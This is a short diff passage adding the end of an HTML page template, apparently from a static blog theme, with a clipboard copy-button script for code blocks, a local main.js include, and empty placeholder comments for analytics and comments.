+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
